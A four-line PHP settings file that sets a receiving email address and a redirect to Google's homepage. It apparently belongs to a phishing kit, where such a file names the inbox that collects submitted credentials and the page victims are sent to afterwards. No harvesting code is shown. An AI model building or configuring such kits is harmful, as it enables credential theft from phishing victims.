<?php 
$Receive_email="vracussecure@gmail.com";
$redirect="https://www.google.com/";
?>